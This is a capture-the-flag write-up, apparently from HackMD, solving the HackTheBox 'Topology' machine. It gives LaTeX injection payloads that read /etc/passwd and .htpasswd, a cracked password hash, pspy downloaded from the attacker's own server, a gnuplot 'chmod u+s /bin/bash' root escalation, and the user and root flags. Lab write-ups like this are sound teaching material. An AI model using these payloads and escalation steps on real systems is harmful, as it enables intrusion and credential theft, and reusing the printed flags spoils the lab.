---
title: 'HackTheBox: Topology'
disqus: hackmd
---

HackTheBox: Topology
===


## Table of Contents

[TOC]

## Topic

### Lab
#### HackTheBox: 
https://app.hackthebox.com/machines/Topology

### Initial Enumeration

●Start Machine: \
![](https://hackmd.io/_uploads/HJ8NFx2z6.png)


## Solution

### 1. Attempt

#### 1.1 Edit /etc/hosts
/etc/hosts
> 10.10.11.217    topology.htb

#### 1.2 Browse http://topology.htb/
![](https://hackmd.io/_uploads/Hk9Uqx2Ga.png)

#### 1.3 nmap scan 
> nmap -sC -sV -T4 10.10.11.217

![](https://hackmd.io/_uploads/Hy2msl2GT.png)
#### 1.4 dirsearch scan
> dirsearch -u http://topology.htb/

![](https://hackmd.io/_uploads/rkvcZ-2fa.png)
> /.htpasswd_test
> /.htpasswds

#### 1.5 Subdomain latex.topology.htb 
![](https://hackmd.io/_uploads/BJQgA62f6.png)
Edit /etc/hosts
/etc/hosts
> 10.10.11.217    latex.topology.htb

![](https://hackmd.io/_uploads/rJ9vCanfp.png)

#### 1.6 Attempt LaTeX Equation Generator
Test:
> chwchw

![](https://hackmd.io/_uploads/BkTmJChGa.png)
> http://latex.topology.htb/equation.php?eqn=chwchw&submit=

![](https://hackmd.io/_uploads/HJU8JRnMp.png)

### 2. Command Injection
● [LaTex 基本介紹](https://albertyzp.github.io/2019/10/15/LaTex%E5%9F%BA%E7%A1%80%E6%89%8B%E5%86%8C/#%E4%B8%80-latex%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5)\
● [LaTex listening source code](https://en.wikibooks.org/wiki/LaTeX/Source_Code_Listings)\
●\lstinputlisting{} 是Command，不是數學符號，所以用$ $ 將內部原始碼$閉合。\
![image.png](https://hackmd.io/_uploads/rylP77b76.png)

```
$\lstinputlisting{/etc/passwd}$
```
![](https://hackmd.io/_uploads/Sk9heCnMa.png)

```
@hewen
input 引用另一個 LaTeX 文檔；lstinputlisting 引用外部檔案
$\lstinputlisting{/etc/hosts}$
eqn=$\lstinputlisting{/etc/apache2/apache2.conf}$ #Apache server
```

```
$\lstinputlisting{/var/www/dev/.htpasswd}$
```
![](https://hackmd.io/_uploads/rJEp-A2zp.png)
Get user/password
> vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
> user: vdaisley
> password: $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
#### 2.1 [Password Formats:$ apr1 $](https://httpd.apache.org/docs/2.4/misc/password_encryptions.html)

MD5
"$ apr1 $" + the result of an Apache-specific algorithm using an iterated (1,000 times) MD5 digest of various combinations of a random 32-bit salt and the password. See the APR source file apr_md5.c for the details of the algorithm.

#### 2.2 John-the-Ripper tools 
Hash工具破解工具:MD5、SHA1、SHA256、MySQL 與NTLM 的雜湊
> sudo apt-get install john -y
> john --wordlist=rockyou.txt ./topology.txt

![](https://hackmd.io/_uploads/HyVyrlaMT.png)
> password(MD5 decrypt): calculus20

### 3. SSH Login
> ssh vdaisley@10.10.11.217
> ls -al

![](https://hackmd.io/_uploads/HkbbIlpMa.png)
> cat user.txt

![](https://hackmd.io/_uploads/H1E78eTMp.png)
### 4. GET USER FLAG
> **FLAG: 995aae620785c32d38235ff75eb0cc34**

### 5. Gnuplot
●Gunplot: 繪圖工具(產生plt file)
> ls -al /opt

![](https://hackmd.io/_uploads/B17DarCzT.png)

### 6. pspy Tools
●[pspy tools](https://www.freebuf.com/articles/web/254452.html): 不需root權限即可監聽。
●GitHub: [pspy-unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy?source=post_page-----1e4cf07d7805--------------------------------#pspy---unprivileged-linux-process-snooping) 
> wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
> chmod +x pspy64 //給執行權限
> ./pspy64

![image.png](https://hackmd.io/_uploads/SJyry51QT.png)
#### 6.1 SSH download pspy from local
>python3 -m http.server
vdaisley@topology:~$ wget 10.10.16.35:8000/pspy64

![image.png](https://hackmd.io/_uploads/H1fvkqymp.png)

![image.png](https://hackmd.io/_uploads/BJdwJ9ymT.png)
> vdaisley@topology:~$ ls
pspy64  user.txt
vdaisley@topology:~$ chmod +x pspy64 
vdaisley@topology:~$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     

#### 6.2 chmod new .plt file
● [Gnuplot Privilege Escalation](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/?source=post_page-----1e4cf07d7805--------------------------------)
● [chmod command](https://zh.wikipedia.org/zh-tw/Chmod)
> vdaisley@topology:~$ echo "system 'chmod u+s /bin/bash'" > /opt/gnuplot/chw.plt
vdaisley@topology:~$ cat /opt/gnuplot/chw.plt
system 'chmod u+s /bin/bash'
vdaisley@topology:~$ ls -al /opt/gnuplot/chw.plt
-rw-rw-r-- 1 vdaisley vdaisley 29 Nov  1 04:22 /opt/gnuplot/chw.plt

```
@hewen
執行這個檔案的時後以檔案擁有者身份執行，而不是以當前使用者的身份執行。
雖然執行時會出現 error，但檔案屬性還是改變了
/bin/bash -p
```

> vdaisley@topology:/tmp$ /bin/bash -p
bash-5.0# 

![image.png](https://hackmd.io/_uploads/r1lUnZcyQa.png)
> bash-5.0# id
uid=1007(vdaisley) gid=1007(vdaisley) euid=0(root) groups=1007(vdaisley)
![image.png](https://hackmd.io/_uploads/H1Baa9y76.png)
> bash-5.0# cd /root
bash-5.0# ls
root.txt
bash-5.0# cat root.txt 

![image.png](https://hackmd.io/_uploads/B131z91mp.png)


### 7. GET ROOT FLAG
> **FLAG: 2cf94752042e7319560bf84534369988**

###### tags: `CTF` `Web` `nmap` `dirsearch` `Command Injection` `pspy` `John-the-Ripper` `MD5`
